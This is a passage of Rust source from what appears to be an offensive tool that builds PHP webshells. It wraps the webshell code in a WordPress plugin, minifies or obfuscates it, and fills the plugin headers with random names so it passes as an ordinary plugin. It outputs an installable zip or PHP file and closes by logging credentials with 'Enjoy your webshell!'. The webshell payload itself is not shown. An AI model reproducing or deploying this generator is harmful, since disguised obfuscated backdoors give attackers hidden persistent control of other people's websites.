					code = code.trim_start_matches("<?php").to_string();

					// Insert the webshell code into the plugin code
					plugin_code = plugin_code.replace("// __TEMPLATE_INSERTION_POINT__", &code);

					// Strip all comments from the plugin code
					if !args.obfuscation.minify {
						plugin_code = strip_comments(&plugin_code);
					} else {
						plugin_code = minify(&plugin_code);
					}

					if args.obfuscation.obfuscate {
						plugin_code = obfuscate(&plugin_code, &args.obfuscation, &functions_prefix);
					}

					// load the CMS options
					let plugin_info = parse_cms_options(php_args);
					let fallback_info = make_wordpress_fallback_info();

					// Get the plugin name from the plugin information or the fallback information
					let plugin_name = plugin_info.get("__PLUGIN_NAME__").unwrap_or(fallback_info.get("__PLUGIN_NAME__").unwrap());

					// Insert the plugin information into the plugin code
					plugin_code.insert_str(
						5,
						&format!(
							"
/*
 * Plugin Name: {}
 * Description: {}
 * Version: {}
 * Author: {}
 * Requires PHP: {}
 */
 ",
							plugin_name,
							plugin_info.get("__PLUGIN_DESCRIPTION__").unwrap_or(fallback_info.get("__PLUGIN_DESCRIPTION__").unwrap()),
							plugin_info.get("__PLUGIN_VERSION__").unwrap_or(fallback_info.get("__PLUGIN_VERSION__").unwrap()),
							plugin_info.get("__PLUGIN_AUTHOR__").unwrap_or(fallback_info.get("__PLUGIN_AUTHOR__").unwrap()),
							php_args.template_version.to_string()
							        .split("&")
							        .collect::<Vec<&str>>()
							        .get(0)
							        .unwrap()
							        .replace("PHP >=", "")
							        .trim()
						),
					);

					// Replace the missing with the previously defined prefix
					plugin_code = plugin_code.replace("__PREFIX__", functions_prefix.as_str());

					// Write the webshell as a WordPress plugin archive if the plugin mode is enabled or not in standalone mode
					if php_args.plugin || !php_args.standalone {
						info!("Generating WordPress plugin archive ...");

						let mut plugin_archive_path = match &args.output {
							Some(output) => PathBuf::from(output),
							None => PathBuf::from("plugin.zip"),
						};

						// Set the output path to the plugin archive
						if !plugin_archive_path.ends_with(".zip") {
							plugin_archive_path.set_extension("zip");
						}

						// Create the plugin archive
						let mut zip = zip::ZipWriter::new(
							std::fs::File::create(&plugin_archive_path)
								.with_context(|| format!("Could not create the plugin archive file: {}", plugin_archive_path.display()))?
						);

						let options = zip::write::SimpleFileOptions::default()
							.compression_method(zip::CompressionMethod::Deflated)
							.unix_permissions(0o777);

						// Add the plugin code to the archive
						zip.start_file(format!("{plugin_name}/plugin.php"), options)
						   .with_context(|| format!("Could not add the plugin code to the archive: {}", plugin_archive_path.display()))?;
						zip.write_all(plugin_code.as_bytes())
						   .with_context(|| format!("Could not write the plugin code to the archive: {}", plugin_archive_path.display()))?;

						zip.finish()
						   .with_context(|| format!("Could not finish the plugin archive: {}", plugin_archive_path.display()))?;

						info!("WordPress plugin archive generated successfully: {}", plugin_archive_path.display());
					}

					// Write the webshell to the output file if not generating a plugin archive or in standalone mode
					if php_args.standalone || !php_args.plugin {
						let mut output_path = match &args.output {
							Some(output) => PathBuf::from(output),
							None => PathBuf::from("plugin.php"),
						};

						// Set the output path to the plugin archive
						if !output_path.ends_with(".php") {
							output_path.set_extension("php");
						}

						std::fs::write(&output_path, plugin_code)
							.with_context(|| format!("Could not write the output file: {}", output_path.display()))?;

						info!("Webshell written to {}", output_path.display());
					}

					info!("Plugin Name: {}", plugin_name);
					info!("Username: {}", args.security.username.as_ref().unwrap());
					info!("Password: {}", args.security.password.as_ref().unwrap());
					info!("Enjoy your webshell!");
				}
				PhpCms::Joomla => {
					error!("Joomla is not implemented yet. Exiting ...");
					unimplemented!("Joomla is not implemented yet");
				}
				PhpCms::Drupal => {
					error!("Drupal is not implemented yet. Exiting ...");
					unimplemented!("Drupal is not implemented yet");
				}
			}
		}
	}*/

	Ok(())
}

/// Generate random information for a WordPress plugin
///
/// This function will generate random information for a WordPress plugin to be used as fallback if the CMS options are
/// not provided
///
/// # Returns
///
/// A HashMap containing the WordPress plugin information
fn make_wordpress_fallback_info() -> HashMap<String, String> {
	let mut fallback_info = HashMap::<String, String>::new();

	fallback_info.insert("__PLUGIN_NAME__".to_string(), generate_random_string(r"\w{10}").unwrap());
	fallback_info.insert("__PLUGIN_DESCRIPTION__".to_string(), generate_random_string(r"\w{20}").unwrap());
	fallback_info.insert("__PLUGIN_VERSION__".to_string(), generate_random_string(r"\d\.\d\.\d").unwrap());
	fallback_info.insert("__PLUGIN_AUTHOR__".to_string(), generate_random_string(r"\w{5}").unwrap());

	fallback_info
}

/// Parse the CMS options
///
/// This function will parse the CMS options passed as arguments and return them as a HashMap
///
/// # Arguments
///
/// * `args` - The CLI arguments
///
/// # Returns
///
/// A HashMap containing the CMS options
fn parse_cms_options(args: &CliGeneratePhpTemplate) -> HashMap<String, String> {
	let mut cms_options = HashMap::<String, String>::new();

	for option in args.cms_option.iter() {
		let key_value: Vec<&str> = option.split('=').collect();

		if key_value.len() != 2 {
			warn!("Invalid CMS option: {}, value discarded", option);
			continue;
		}

		cms_options.insert(key_value[0].to_string(), key_value[1].to_string());
	}

	debug!("CMS options parsed: {:?}", cms_options);

	cms_options
}
